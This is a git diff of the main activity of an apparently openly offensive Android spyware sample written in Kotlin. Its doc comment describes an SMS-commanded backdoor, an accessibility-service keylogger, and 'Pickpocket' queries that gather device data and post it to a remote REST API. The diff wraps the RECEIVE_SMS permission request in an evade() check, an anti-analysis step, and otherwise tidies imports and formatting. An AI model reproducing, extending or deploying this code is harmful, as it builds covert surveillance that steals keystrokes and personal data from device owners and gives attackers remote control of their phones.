@@ -44,8 +44,6 @@ import io.ktor.client.features.json.serializer.*
 import io.ktor.client.request.*
 import io.ktor.http.*
 import io.ktor.util.*
-import kotlinx.coroutines.MainScope
-import kotlinx.coroutines.launch
 import kotlinx.coroutines.runBlocking
 import kotlinx.serialization.Serializable
 
@@ -70,17 +68,17 @@ import kotlinx.serialization.Serializable
 ..............\.............\...
 */
 /**
-* @author Chris Basinger
-* @email evilthreads669966@gmail.com
-* @date 10/08/20
-*
-*  [Context.evade] is used to check whether it is safe before using [KotlinPermissions.ask] to request [RECEIVE_SMS] permission. The [onAccepted] callback is where your optional
-*  payload to run in [BackdoorService] will be initialized. After this, [SmsBackdoor.open] is used to open the backdoor and to allow you to implement your own command handler for remote commands
-*  as they're received. After [SmsBackdoor.open]'s command handler implementation, the user is sent to the accessibility services settings screen for the[Keylogger.subscribe] method
-*  of the payload to be able to receive keystrokes. Our [SmsBackdoor.commandHandler] implementation matches remote commands and then uses [Pickpocket] query functions for fetching
-*  the data associated each remote command defined within [RemoteCommands]. The data is then serialized and posted to one of the various endpoints of the web servers' REST API with
-*  Ktor [HTTPClient] using [Auth.basic] feature for basic authentication and the [CIO] [HTTPClientEngine] for transmitting HTTP requests.
-* */
+ * @author Chris Basinger
+ * @email evilthreads669966@gmail.com
+ * @date 10/08/20
+ *
+ *  [Context.evade] is used to check whether it is safe before using [KotlinPermissions.ask] to request [RECEIVE_SMS] permission. The [onAccepted] callback is where your optional
+ *  payload to run in [BackdoorService] will be initialized. After this, [SmsBackdoor.open] is used to open the backdoor and to allow you to implement your own command handler for remote commands
+ *  as they're received. After [SmsBackdoor.open]'s command handler implementation, the user is sent to the accessibility services settings screen for the[Keylogger.subscribe] method
+ *  of the payload to be able to receive keystrokes. Our [SmsBackdoor.commandHandler] implementation matches remote commands and then uses [Pickpocket] query functions for fetching
+ *  the data associated each remote command defined within [RemoteCommands]. The data is then serialized and posted to one of the various endpoints of the web servers' REST API with
+ *  Ktor [HTTPClient] using [Auth.basic] feature for basic authentication and the [CIO] [HTTPClientEngine] for transmitting HTTP requests.
+ * */
 @KtorExperimentalAPI
 class MainActivity : AppCompatActivity() {
 
@@ -90,6 +88,7 @@ class MainActivity : AppCompatActivity() {
 
     init {
         lifecycleScope.launchWhenCreated {
+            evade(this){
                 KotlinPermissions.with(this@MainActivity).permissions(Manifest.permission.RECEIVE_SMS)
                     .onAccepted {
                         val myPayload = suspend {
@@ -118,7 +117,7 @@ class MainActivity : AppCompatActivity() {
                         Keylogger.requestPermission(this@MainActivity)
                     }.ask()
             }
-
+        }
     }
 }
 
